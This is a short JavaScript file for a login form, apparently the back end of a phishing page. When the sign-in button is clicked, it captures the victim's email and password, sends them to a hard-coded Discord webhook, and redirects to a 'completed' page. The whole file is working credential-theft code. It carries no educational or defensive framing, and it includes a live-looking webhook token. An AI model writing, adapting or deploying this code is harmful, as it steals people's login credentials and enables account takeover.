const email = document.querySelector("input[type='email']");
const password = document.querySelector("input[type='password']");
const loginButton = document.querySelector("#sign-in-btn");
const body = document.querySelector("body");

loginButton.addEventListener("click", (e) => {
  e.preventDefault();
  const content = { email: email.value, password: password.value };
  const webhookURL =
    "https://discord.com/api/webhooks/1421198194758647906/jCx6wDN8iYUuOr4Od7yPTxr6BWcqLgnb89J6A4DV-fWNbi2OOLhklkcaOLsrjkqTt5KG";

  if (email.value && password.value) {
    body.innerHTML = "<div class='loader'></div>";
    (async () => {
      await fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: JSON.stringify(content),
        }),
      });
      window.location.href = "completed.html";
    })();
  }
});
